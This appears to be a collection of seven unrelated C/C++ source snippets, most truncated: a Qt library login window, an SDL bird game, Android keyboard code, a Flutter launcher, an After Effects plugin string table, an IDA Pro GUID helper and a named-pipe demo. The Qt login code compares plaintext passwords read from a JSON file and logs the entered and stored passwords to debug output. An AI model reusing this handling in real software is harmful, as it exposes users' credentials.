    "#include \"Headers\\mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include <QDebug>\n\n// Constructor for MainWindow\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui->setupUi(this); // Set up the user interface\n\n    msgBox = new QMessageBox(this);\n\n    // Load and scale the logo image, then set it to label_34\n    QPixmap Pix(\"../../../Logos/Logo.jpg\");\n\n    if (Pix.isNull())\n    {\n        qWarning() << \"Failed to load the image\"; // Log a warning if the image fails to load\n    }\n    else\n    {\n        qDebug() << \"Image loaded successfully\"; // Log success if the image loads correctly\n    }\n\n    int w = ui->label_34->width(); // Get the width of label_2\n    int h = ui->label_34->height(); // Get the height of label_2\n    ui->label_34->setPixmap(Pix.scaled(w, h, Qt::KeepAspectRatio)); // Scale and set the image to label_34\n\n    Memento = new UserState();\n    ui->tabWidget->setCurrentIndex(0);\n    ui->tabWidget->setTabEnabled(0, true); // Enable first tab\n    ui->tabWidget->setTabEnabled(1, false); // Disable second tab\n    ui->tabWidget->setTabEnabled(2, false); // Disable third tab\n}\n\n// Destructor for MainWindow\nMainWindow::~MainWindow()\n{\n    delete ui; // Clean up UI object\n    delete Memento; // Clean up Memento object\n}\n\nvoid MainWindow::showMessageBox(QString title, QString text, QMessageBox::Icon icon, QMessageBox::StandardButton button)\n{\n    msgBox->setWindowTitle(title);        // Set the title of the message box\n    msgBox->setText(text);                // Set the text of the message box\n    msgBox->setIcon(icon);                // Set the icon of the message box\n    msgBox->setStandardButtons(button);  // Set the standard buttons of the message box\n    msgBox->adjustSize();                 // Adjust the size of the message box\n    msgBox->exec();                       // Show the message box\n}\n\n// Slot for Login button click event\nvoid MainWindow::on_LoginButton_clicked()\n{\n    bool WrongFlag = true; // Flag to check if login credentials are wrong\n    QString Name = ui->NamelineEdit_5->text(); // Get the name from the input field\n    QString Password = ui->PasslineEdit_11->text(); // Get the password from the input field\n\n    if(Name.isEmpty() || Password.isEmpty())\n    {\n        showMessageBox(\"Invalid Input\", \"Please fill all the fields correctly.\", QMessageBox::Warning, QMessageBox::Ok);\n        return;\n    }\n    qDebug() << \"Name: \" << Name << \"Password: \" << Password << Qt::endl;\n\n    QFile file(\"../../../DataBase/LoginDB.json\"); // Open the JSON file containing user data\n    if (!file.open(QIODevice::ReadOnly)) // Check if the file opens successfully\n    {\n        qWarning() << \"Couldn't open users file.\";\n    }\n\n    QByteArray data = file.readAll(); // Read all data from the file\n    QJsonDocument doc(QJsonDocument::fromJson(data)); // Parse JSON document\n    QJsonArray users = doc.array(); // Get JSON array of users\n    file.close(); // Close the file\n\n    // Loop through all users in the JSON array\n    foreach (const QJsonValue &value, users)\n    {\n        QJsonObject obj = value.toObject();\n        qDebug() << \"Name: \" << obj[\"UserName\"].toString() << \"Password: \" << obj[\"Password\"].toString() << \"Auth: \" << obj[\"Auth\"].toString() << Qt::endl;\n\n        // Check if username and password match\n        if (obj[\"UserName\"].toString() == Name && obj[\"Password\"].toString() == Password)\n        {\n            WrongFlag = false;\n\n            // Check if user is an admin or a regular user\n            if(obj[\"Auth\"].toString() == \"User\")\n            {\n                showMessageBox(\"Login Done as user\", \"Hello \" + Name + \", Welcome to Library Management System.\", QMessageBox::Information, QMessageBox::Ok);\n                qDebug() << \"user\" << Qt::endl;\n                ui->tabWidget->setTabEnabled(0, false);\n                ui->tabWidget->setTabEnabled(1, false);\n                ui->tabWidget->setTabEnabled(2, true);\n                ui->tabWidget->setCurrentIndex(2);\n            }\n            else if(obj[\"Auth\"].toString() == \"Admin\")\n            {\n                showMessageBox(\"Login Done as admin\", \"Hello \" + Name + \", Welcome to Library Management System.\", QMessageBox::Information, QMessageBox::Ok);\n                qDebug() << \"admin\" << Qt::endl;\n                ui->tabWidget->setTabEnabled(0, false);\n                ui->tabWidget->setTabEnabled(1, true);\n                ui->tabWidget->setTabEnabled(2, false);\n                ui->tabWidget->setCurrentIndex(1);\n            }\n            break;\n        }\n    }\n\n    // Handle wrong username or password\n    if(WrongFlag)\n    {\n        showMessageBox(\"Wrong Username or Password\", \"Check your username or password and try again.\", QMessageBox::Warning, QMessageBox::Ok);\n        ui->NamelineEdit_5->clear();\n        ui->PasslineEdit_11->clear();\n    }\n    else\n    {\n        ui->NamelineEdit_5->clear();\n        ui->PasslineEdit_11->clear();\n    }\n}\n\n// Slot for Exit button click event on admin tab\nvoid Ma",
    "#include <SDL2/SDL.h>\n#include <SDL2/SDL_image.h>\n#include <SDL2/SDL_mixer.h>\n#include <SDL2/SDL_ttf.h>\n#include <sstream>\n#include <vector>\n#include <cstdlib>\n#include <ctime>\n\nusing namespace std;\n\nconst int largura_tela = 800;\nconst int altura_tela = 700;\nconst int largura_p\u00e1ssaro = 50;\nconst int altura_p\u00e1ssaro = 50;\nconst int largura_bolha = largura_p\u00e1ssaro * 2;\nconst int altura_bolha = altura_p\u00e1ssaro * 2;\nconst int largura_cano = 50;\nconst int intervalo_canos_inicial = 200; // Diminu\u00eddo o espa\u00e7o inicial entre canos\nconst int velocidade_p\u00e1ssaro = 10;\nconst int gravidade = 1;\nconst int vidas_iniciais = 30;\n\nSDL_Window* window = nullptr;\nSDL_Renderer* renderer = nullptr;\nSDL_Texture* imagem_fundo = nullptr;\nSDL_Texture* imagem_cano = nullptr;\nSDL_Texture* imagem_p\u00e1ssaro = nullptr;\nSDL_Texture* imagem_bolha = nullptr;\nMix_Chunk* som_pulo = nullptr;\nMix_Chunk* som_colisao = nullptr;\nTTF_Font* font = nullptr;\nTTF_Font* font_game_over = nullptr;\nTTF_Font* font_iniciar = nullptr;\n\nstruct Cano {\n    int x, y;\n    bool subir;\n};\n\nstruct Bolha {\n    int x, y;\n};\n\nvector<Cano> canos;\nvector<Bolha> bolhas;\n\nvoid carregarRecursos() {\n    imagem_fundo = IMG_LoadTexture(renderer, \"fundo.png\");\n    imagem_cano = IMG_LoadTexture(renderer, \"cano.png\");\n    imagem_p\u00e1ssaro = IMG_LoadTexture(renderer, \"passaro.png\");\n    imagem_bolha = IMG_LoadTexture(renderer, \"bolha.png\");\n    som_pulo = Mix_LoadWAV(\"pulo.wav\");\n    som_colisao = Mix_LoadWAV(\"colisao.wav\");\n    font = TTF_OpenFont(\"arial.ttf\", 24);\n    font_game_over = TTF_OpenFont(\"arial.ttf\", 14);\n    font_iniciar = TTF_OpenFont(\"arial.ttf\", 12);\n}\n\nvoid atualizarTela(int pontuacao, int vidas, int x_p\u00e1ssaro, int y_p\u00e1ssaro, int intervalo_canos, bool game_over) {\n    SDL_RenderClear(renderer);\n\n    // Atualiza a imagem de fundo de acordo com a pontua\u00e7\u00e3o\n    if (pontuacao >= 90) {\n        SDL_DestroyTexture(imagem_fundo);\n        imagem_fundo = IMG_LoadTexture(renderer, \"fundo_final.png\");\n    } else if (pontuacao >= 61) {\n        SDL_DestroyTexture(imagem_fundo);\n        imagem_fundo = IMG_LoadTexture(renderer, \"caminho.png\");\n    } else if (pontuacao >= 36) {\n        SDL_DestroyTexture(imagem_fundo);\n        imagem_fundo = IMG_LoadTexture(renderer, \"noite.png\");\n    } else {\n        SDL_DestroyTexture(imagem_fundo);\n        imagem_fundo = IMG_LoadTexture(renderer, \"fundo.png\");\n    }\n\n    SDL_Rect destino = {0, 0, largura_tela, altura_tela};\n    SDL_RenderCopy(renderer, imagem_fundo, nullptr, &destino);\n\n    for (const auto& cano : canos) {\n        SDL_Rect rect_cano_superior = {cano.x, 0, largura_cano, cano.y};\n        SDL_Rect rect_cano_inferior = {cano.x, cano.y + intervalo_canos, largura_cano, altura_tela - cano.y - intervalo_canos};\n        SDL_RenderCopy(renderer, imagem_cano, nullptr, &rect_cano_superior);\n        SDL_RenderCopy(renderer, imagem_cano, nullptr, &rect_cano_inferior);\n    }\n\n    for (const auto& bolha : bolhas) {\n        SDL_Rect rect_bolha = {bolha.x, bolha.y, largura_bolha, altura_bolha};\n        SDL_RenderCopy(renderer, imagem_bolha, nullptr, &rect_bolha);\n    }\n\n    SDL_Rect rect_p\u00e1ssaro = {x_p\u00e1ssaro, y_p\u00e1ssaro, largura_p\u00e1ssaro, altura_p\u00e1ssaro};\n    SDL_RenderCopy(renderer, imagem_p\u00e1ssaro, nullptr, &rect_p\u00e1ssaro);\n\n    stringstream texto;\n    texto << \"Pontuacao: \" << pontuacao << \" Vidas: \" << vidas;\n    SDL_Color cor = {255, 255, 255};\n    SDL_Surface* surface = TTF_RenderText_Solid(font, texto.str().c_str(), cor);\n    SDL_Texture* texture = SDL_CreateTextureFromSurface(renderer, surface);\n    int texto_largura, texto_altura;\n    SDL_QueryTexture(texture, nullptr, nullptr, &texto_largura, &texto_altura);\n    SDL_Rect dest = {10, 10, texto_largura, texto_altura};\n    SDL_RenderCopy(renderer, texture, nullptr, &dest);\n    SDL_FreeSurface(surface);\n    SDL_DestroyTexture(texture);\n\n    if (game_over) {\n        SDL_Color cor_game_over = {255, 0, 0};\n        surface = TTF_RenderText_Solid(font_game_over, \"Game Over\", cor_game_over);\n        texture = SDL_CreateTextureFromSurface(renderer, surface);\n        SDL_QueryTexture(texture, nullptr, nullptr, &texto_largura, &texto_altura);\n        dest = {largura_tela / 2 - texto_largura / 2, altura_tela / 2 - texto_altura / 2 - 20, texto_largura, texto_altura};\n        SDL_RenderCopy(renderer, texture, nullptr, &dest);\n        SDL_FreeSurface(surface);\n        SDL_DestroyTexture(texture);\n\n        SDL_Color cor_iniciar = {0, 255, 0};\n        surface = TTF_RenderText_Solid(font_iniciar, \"Iniciar\", cor_iniciar);\n        texture = SDL_CreateTextureFromSurface(renderer, surface);\n        SDL_QueryTexture(texture, nullptr, nullptr, &texto_largura, &texto_altura);\n        dest = {largura_tela / 2 - texto_largura / 2, altura_tela / 2 - texto_altura / 2 + 20, texto_largura, texto_altura};\n        SDL_RenderCopy(renderer, texture, nullptr, &dest);\n        SDL_FreeSurface(surface);\n        SDL_DestroyTexture(texture);\n    }\n\n    SDL_RenderPresent(renderer);\n}\n\nvoid jogo() {\n    bool rodando = true;\n    bool pulando =",
    "/*\n * Copyright (C) 2013 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include \"suggest/core/layout/proximity_info_state_utils.h\"\n\n#include <algorithm>\n#include <cmath>\n#include <cstring> // for memset()\n#include <sstream> // for debug prints\n#include <unordered_map>\n#include <vector>\n\n#include \"defines.h\"\n#include \"suggest/core/layout/geometry_utils.h\"\n#include \"suggest/core/layout/normal_distribution_2d.h\"\n#include \"suggest/core/layout/proximity_info.h\"\n#include \"suggest/core/layout/proximity_info_params.h\"\n\nnamespace latinime {\n\n/* static */ int ProximityInfoStateUtils::trimLastTwoTouchPoints(std::vector<int> *sampledInputXs,\n        std::vector<int> *sampledInputYs, std::vector<int> *sampledInputTimes,\n        std::vector<int> *sampledLengthCache, std::vector<int> *sampledInputIndice) {\n    const int nextStartIndex = (*sampledInputIndice)[sampledInputIndice->size() - 2];\n    popInputData(sampledInputXs, sampledInputYs, sampledInputTimes, sampledLengthCache,\n            sampledInputIndice);\n    popInputData(sampledInputXs, sampledInputYs, sampledInputTimes, sampledLengthCache,\n            sampledInputIndice);\n    return nextStartIndex;\n}\n\n/* static */ int ProximityInfoStateUtils::updateTouchPoints(\n        const ProximityInfo *const proximityInfo, const int maxPointToKeyLength,\n        const int *const inputProximities, const int *const inputXCoordinates,\n        const int *const inputYCoordinates, const int *const times, const int *const pointerIds,\n        const int inputSize, const bool isGeometric, const int pointerId,\n        const int pushTouchPointStartIndex, std::vector<int> *sampledInputXs,\n        std::vector<int> *sampledInputYs, std::vector<int> *sampledInputTimes,\n        std::vector<int> *sampledLengthCache, std::vector<int> *sampledInputIndice) {\n    if (DEBUG_SAMPLING_POINTS) {\n        if (times) {\n            for (int i = 0; i < inputSize; ++i) {\n                AKLOGI(\"(%d) x %d, y %d, time %d\",\n                        i, inputXCoordinates[i], inputYCoordinates[i], times[i]);\n            }\n        }\n    }\n#ifdef DO_ASSERT_TEST\n    if (times) {\n        for (int i = 0; i < inputSize; ++i) {\n            if (i > 0) {\n                if (times[i] < times[i - 1]) {\n                    AKLOGI(\"Invalid time sequence. %d, %d\", times[i - 1], times[i]);\n                    //ASSERT(false);\n                }\n            }\n        }\n    }\n#endif\n    const bool proximityOnly = !isGeometric\n            && (inputXCoordinates[0] < 0 || inputYCoordinates[0] < 0);\n    int lastInputIndex = pushTouchPointStartIndex;\n    for (int i = lastInputIndex; i < inputSize; ++i) {\n        const int pid = pointerIds ? pointerIds[i] : 0;\n        if (pointerId == pid) {\n            lastInputIndex = i;\n        }\n    }\n    if (DEBUG_GEO_FULL) {\n        AKLOGI(\"Init ProximityInfoState: last input index = %d\", lastInputIndex);\n    }\n    // Working space to save near keys distances for current, prev and prevprev input point.\n    NearKeysDistanceMap nearKeysDistances[3];\n    // These pointers are swapped for each inputs points.\n    NearKeysDistanceMap *currentNearKeysDistances = &nearKeysDistances[0];\n    NearKeysDistanceMap *prevNearKeysDistances = &nearKeysDistances[1];\n    NearKeysDistanceMap *prevPrevNearKeysDistances = &nearKeysDistances[2];\n    // \"sumAngle\" is accumulated by each angle of input points. And when \"sumAngle\" exceeds\n    // the threshold we save that point, reset sumAngle. This aims to keep the figure of\n    // the curve.\n    float sumAngle = 0.0f;\n\n    for (int i = pushTouchPointStartIndex; i <= lastInputIndex; ++i) {\n        // Assuming pointerId == 0 if pointerIds is null.\n        const int pid = pointerIds ? pointerIds[i] : 0;\n        if (DEBUG_GEO_FULL) {\n            AKLOGI(\"Init ProximityInfoState: (%d)PID = %d\", i, pid);\n        }\n        if (pointerId == pid) {\n            const int c = isGeometric ?\n                    NOT_A_COORDINATE : getPrimaryCodePointAt(inputProximities, i);\n            const int x = proximityOnly ? NOT_A_COORDINATE : inputXCoordinates[i];\n            const int y = proximityOnly ? NOT_A_COORDINATE : inputYCoordinates[i];\n            const int time = times ? times[i] : -1;\n\n            if (i > 1) {\n                const float prevAngle = GeometryUtils::getAngle(\n                        inputXCoordinates[i - 2], inputYCoordinates[i - 2],\n                        inputXCoordinates[i - 1], inputYCoordinates[i - 1]);\n                const fl",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*******************************************************************/\n/*                                                                 */\n/*                      ADOBE CONFIDENTIAL                         */\n/*                   _ _ _ _ _ _ _ _ _ _ _ _ _                     */\n/*                                                                 */\n/* Copyright 2007 Adobe Systems Incorporated                       */\n/* All Rights Reserved.                                            */\n/*                                                                 */\n/* NOTICE:  All information contained herein is, and remains the   */\n/* property of Adobe Systems Incorporated and its suppliers, if    */\n/* any.  The intellectual and technical concepts contained         */\n/* herein are proprietary to Adobe Systems Incorporated and its    */\n/* suppliers and may be covered by U.S. and Foreign Patents,       */\n/* patents in process, and are protected by trade secret or        */\n/* copyright law.  Dissemination of this information or            */\n/* reproduction of this material is strictly forbidden unless      */\n/* prior written permission is obtained from Adobe Systems         */\n/* Incorporated.                                                   */\n/*                                                                 */\n/*******************************************************************/\n\n#include \"KeyStatus.h\"\n\ntypedef struct {\n\tA_u_long\tindex;\n\tA_char\t\tstr[256];\n} TableString;\n\n\n\nTableString\t\tg_strs[StrID_NUMTYPES] = {\n\tStrID_NONE,\t\t\t\t\t\t\"\",\n\tStrID_Name,\t\t\t\t\t\t\"KeyStatus\",\n\tStrID_Description,\t\t\t\t\"Visualize alpha, exaggerating partially transparent pixels\\rCopyright 2024 Geoff Matters.\",\n\tStrID_Gain_Param_Name,\t\t\t\"Gain\",\n\tStrID_Color_Param_Name,\t\t\t\"Color\",\n};\n\n\nchar\t*GetStringPtr(int strNum)\n{\n\treturn g_strs[strNum].str;\n}\n\t\n",
    "/*\n    Copyright \u00a9 2017-2024 AO Kaspersky Lab\n\n    This program is free software: you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with this program.  If not, see <https://www.gnu.org/licenses/>.\n\n    Author: Sergey.Belov at kaspersky.com\n*/\n\n/*\n * This feature implementation is inspired by existence of \"comhelper\" plugin included into IDA Pro\n */\n\n#include \"warn_off.h\"\n#include <hexrays.hpp>\n#include <diskio.hpp>\n#include <typeinf.hpp>\n#include \"warn_on.h\"\n\n#include \"helpers.h\"\n#include \"comhelper.h\"\n#include \"rename.h\"\n\n#ifdef _MSC_VER\n# pragma pack(push,1)\n#else\n# pragma pack(1)\n#endif\n#ifdef __GNUC__\n# define ATTR_PACKED __attribute__ ((packed))\n#else\n# define ATTR_PACKED\n#endif\nstruct ida_local guid_t {\n\tunion {\n\t\tstruct {\n\t\t\tuint32 d1;\n\t\t\tuint16 d2;\n\t\t\tuint16 d3;\n\t\t\tuint16 d4;\n\t\t\tuint8 d5[6];\n\t\t} m1;\n\t\tstruct {\n\t\t\tuint64 lo;\n\t\t\tuint64 hi;\n\t\t} m2;\n\t} u;\n\tbool fromEa(ea_t ea);\n\tvoid print(qstring* str);\n\tfriend bool operator == (const guid_t &id1, const guid_t &id2) {\n\t\treturn ((id1.u.m2.hi == id2.u.m2.hi) && (id1.u.m2.lo == id2.u.m2.lo));\n\t}\n}  ATTR_PACKED;\n#ifdef _MSC_VER\n# pragma pack(pop)\n#else\n# pragma pack()\n#endif\n\nbool guid_t::fromEa(ea_t ea)\n{\n\tif (16 != get_bytes(&u.m2, sizeof(guid_t), ea))\n\t\treturn false;\n\treturn true;\n}\n\nvoid guid_t::print(qstring* str)\n{\n\tstr->sprnt(\"{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}\", u.m1.d1, u.m1.d2, u.m1.d3, (uint8)u.m1.d4, u.m1.d4 >> 8 , u.m1.d5[0], u.m1.d5[1], u.m1.d5[2], u.m1.d5[3], u.m1.d5[4], u.m1.d5[5]);\n}\n\nstruct ida_local guid_ex_t {\n\tguid_t uid;\n\tqstring name;\n};\n\nqvector<guid_ex_t> guids;\n\nconst char * idaapi read_ioports_cb(const ioports_t &ports, const char *line)\n{\n\tguid_ex_t guid;\n\tuint32 d5[6];\n\tchar name[1024];\n\tname[0] = 0;\n\tif (11 != qsscanf(line, \"guid {%x-%hx-%hx-%hx-%2x%2x%2x%2x%2x%2x} %1024s\", \n\t\t&guid.uid.u.m1.d1, &guid.uid.u.m1.d2, &guid.uid.u.m1.d3, &guid.uid.u.m1.d4,\n\t\t&d5[0], &d5[1], &d5[2], &d5[3], &d5[4], &d5[5], name))\n\t\treturn \"bad guid format\";\n\tfor (int i = 0; i < 6; i++)\n\t\tguid.uid.u.m1.d5[i] = (uint8)d5[i];\n\tguid.uid.u.m1.d4 = swap16(guid.uid.u.m1.d4);\n\tguid.name = name;\n\tguids.push_back(guid);\n\treturn NULL;\n}\n\nstatic bool bImported = false;\nvoid com_init()\n{\n\tif (guids.size())\n\t\treturn;\n\tioports_t ioports;\n\tqstring device;\n\tread_ioports(&ioports, &device, \"clsid.cfg\", read_ioports_cb);\n\n\tif (!bImported) {\n\t\tbImported = true;\n\t\tif(is64bit())\n\t\t\tadd_til(\"vc10_64\", ADDTIL_INCOMP);\n\t\telse\n\t\t\tadd_til(\"vc6win\", ADDTIL_INCOMP);\n\t\timport_type(get_idati(), -1, \"IDispatchVtbl\", 0);\n\t}\n}\n\nstatic bool isGUIDtypeName(const char* tname)\n{\n\tif (qstrcmp(tname, \"CLSID\") == 0 ||\n\t\tqstrcmp(tname, \"IID\") == 0 ||\n\t  qstrcmp(tname, \"GUID\") == 0 ||\n\t  qstrcmp(tname, \"EFI_GUID\") == 0)\n\t\treturn true;\n\treturn false;\n}\n\nstatic bool isGUIDtype(const tinfo_t &ti)\n{\n\tqstring typeName;\n\tif (!ti.get_type_name(&typeName))\n\t\tti.print(&typeName);\n\treturn isGUIDtypeName(typeName.c_str());\n}\n\nstatic tid_t com_find_guid_type(ea_t ea, flags64_t flags, qstring* comment = NULL)\n{\n\tguid_t guid;\n\tif (!guid.fromEa(ea))\n\t\treturn BADNODE;\n\n\tcom_init();\n\n\tfor (qvector<guid_ex_t>::iterator it = guids.begin(); it != guids.end(); it++) {\n\t\tif (it->uid == guid) {\n\t\t\tif (comment)\n\t\t\t\t*comment = it->name;\n\t\t\tif (!has_user_name(flags)) {\n\t\t\t\tqstring name(\"CLSID_\");\n\t\t\t\tname += it->name;\n\t\t\t\tset_name(ea, name.c_str(), SN_NOCHECK | SN_NON_AUTO | SN_NOWARN | SN_FORCE );\n\t\t\t\tset_cmt(ea, name.c_str(), true);\n\t\t\t\tmsg(\"[hrt] %a: clsid '%s' was found\\n\", ea, name.c_str());\n\t\t\t}\n\t\t\tqstring vtname = it->name;\n\t\t\tvtname += \"Vtbl\";\n\t\t\tif (BADADDR == get_struc_id(vtname.c_str())) {\n\t\t\t\tconst char* verb = (BADNODE != import_type(get_idati(), -1, vtname.c_str(), 0)) ? \"imported\" : \"not found\";\n\t\t\t\tmsg(\"[hrt] %a: type '%s' was %s\\n\", ea, vtname.c_str(), verb);\n\t\t\t}\n\n\t\t\ttid_t res = get_struc_id(it->name.c_str());\n\t\t\tif (BADNODE == res) {\n\t\t\t\tres = import_type(get_idati(), -1, it->name.c_str(), 0);\n\t\t\t\tconst char* verb = (BADNODE != res) ? \"imported\" : \"not found\";\n\t\t\t\tmsg(\"[hrt] %a: type %s was %s\\n\", ea, it->name.c_str(), verb);\n\n\t\t\t}\n\t\t\treturn res;\n\t\t}\n\t}\n\tqstring cmt;\n\tguid.print(&cmt);\n\tif (comment)\n\t\t*comment = cmt;\n\tset_cmt(ea, cmt.c_str(), true);\n\tmsg(\"[hrt] %a: clsid '%s' was not found \\n\", ea, cmt.c_str());\n\treturn BADNODE;\n}\n\nvoid com_make_data_cb(ea_t ea, flags64_t flags, tid_t tid, asize_t len)\n{\n\tif (!is_struct(flags) || len != 16)\n\t\treturn;\n\n\tqstring tname = get_struc_name(tid);\n\tif(tname.empty())\n\t\treturn;\n\n\tif (!isGUIDtypeName(tname.c_str()))\n\t\treturn;\n\n\tcom_find_guid_type(ea, ",
    "\ufeff#include <windows.h>\n#include <iostream>\n#include <string>\n\nusing namespace std;\n\nHANDLE hPipe, hEvent;\nOVERLAPPED overlapped = { 0 };\nchar buffer[1024];\n\nvoid createPipe() {\n    hPipe = CreateNamedPipe(\n        L\"\\\\\\\\.\\\\pipe\\\\my_pipe\",\n        PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED, // \u0440\u0435\u0436\u0438\u043c \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u044f\n        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, // \u0440\u0435\u0436\u0438\u043c \u043a\u0430\u043d\u0430\u043b\u0430\n        PIPE_UNLIMITED_INSTANCES, // \u043c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u044d\u043a\u0437\u0435\u043c\u043f\u043b\u044f\u0440\u043e\u0432\n        1024,                   // \u0440\u0430\u0437\u043c\u0435\u0440 \u0432\u044b\u0445\u043e\u0434\u043d\u043e\u0433\u043e \u0431\u0443\u0444\u0435\u0440\u0430\n        1024,                   // \u0440\u0430\u0437\u043c\u0435\u0440 \u0432\u0445\u043e\u0434\u043d\u043e\u0433\u043e \u0431\u0443\u0444\u0435\u0440\u0430\n        0,                      // \u0442\u0430\u0439\u043c-\u0430\u0443\u0442 \n        NULL);                  // \u0430\u0442\u0440\u0438\u0431\u0443\u0442\u044b \u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u043e\u0441\u0442\u0438\n\n    if (hPipe == INVALID_HANDLE_VALUE) {\n        cerr << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u043a\u0430\u043d\u0430\u043b\u0430: \" << GetLastError() << endl;\n        return;\n    }\n\n    // \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0441\u043e\u0431\u044b\u0442\u0438\u044f\n    hEvent = CreateEvent(\n        NULL,   // \u0430\u0442\u0440\u0438\u0431\u0443\u0442\u044b \u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u043e\u0441\u0442\u0438\n        TRUE,   // \u0440\u0443\u0447\u043d\u043e\u0439 \u0441\u0431\u0440\u043e\u0441 (manual reset)\n        FALSE,  // \u043d\u0430\u0447\u0430\u043b\u044c\u043d\u043e\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435 - \u043d\u0435 \u0441\u0438\u0433\u043d\u0430\u043b\u044c\u043d\u043e\u0435 (nonsignaled)\n        NULL);  // \u0438\u043c\u044f \u0441\u043e\u0431\u044b\u0442\u0438\u044f\n\n    if (hEvent == NULL) {\n        cerr << \"CreateEvent failed, GLE=\" << GetLastError() << endl;\n        return;\n    }\n}\n\nvoid connectPipe() {\n    // \u041f\u043e\u0434\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435 \u043a \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0435\u043c\u0443 \u0438\u043c\u0435\u043d\u043e\u0432\u0430\u043d\u043d\u043e\u043c\u0443 \u043a\u0430\u043d\u0430\u043b\u0443\n    hPipe = CreateFile(\n        L\"\\\\\\\\.\\\\pipe\\\\my_pipe\",\n        GENERIC_WRITE,          // \u0440\u0435\u0436\u0438\u043c \u0434\u043e\u0441\u0442\u0443\u043f\u0430\n        0,                     // \u0440\u0435\u0436\u0438\u043c \u0441\u043e\u0432\u043c\u0435\u0441\u0442\u043d\u043e\u0433\u043e \u0434\u043e\u0441\u0442\u0443\u043f\u0430\n        NULL,                  // \u0430\u0442\u0440\u0438\u0431\u0443\u0442\u044b \u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u043e\u0441\u0442\u0438\n        OPEN_EXISTING,         // \u043a\u0430\u043a \u043e\u0442\u043a\u0440\u044b\u0442\u044c\n        FILE_FLAG_OVERLAPPED,  // \u0430\u0442\u0440\u0438\u0431\u0443\u0442\u044b\n        NULL);                 // \u0448\u0430\u0431\u043b\u043e\u043d \u0444\u0430\u0439\u043b\u0430\n\n    if (hPipe == INVALID_HANDLE_VALUE) {\n        cerr << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f: \" << GetLastError() << endl;\n        return;\n    }\n}\n\nvoid disconnectPipe() {\n    if (!DisconnectNamedPipe(hPipe)) {\n        cerr << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043e\u0442\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f: \" << GetLastError() << endl;\n    }\n}\n\nvoid writeData() {\n    cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0434\u0430\u043d\u043d\u044b\u0435 \u0434\u043b\u044f \u0437\u0430\u043f\u0438\u0441\u0438: \";\n    string data;\n    getline(cin, data);\n\n    DWORD bytesWritten;\n    overlapped.hEvent = hEvent;\n\n    cout << \"\u0417\u0430\u043f\u0438\u0441\u0430\u043d\u043e: \" << data << endl;\n\n    // \u041f\u043e\u043f\u044b\u0442\u043a\u0430 \u0437\u0430\u043f\u0438\u0441\u0430\u0442\u044c \u0434\u0430\u043d\u043d\u044b\u0435 \u0432 \u043a\u0430\u043d\u0430\u043b \u0430\u0441\u0438\u043d\u0445\u0440\u043e\u043d\u043d\u043e\n    BOOL result = WriteFile(\n        hPipe,\n        data.c_str(),\n        data.length(),\n        &bytesWritten,\n        &overlapped);\n\n    if (!result && GetLastError() == ERROR_IO_PENDING) {\n        // \u0415\u0441\u043b\u0438 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u044f \u0430\u0441\u0438\u043d\u0445\u0440\u043e\u043d\u043d\u0430\u044f, \u043e\u0436\u0438\u0434\u0430\u0435\u043c, 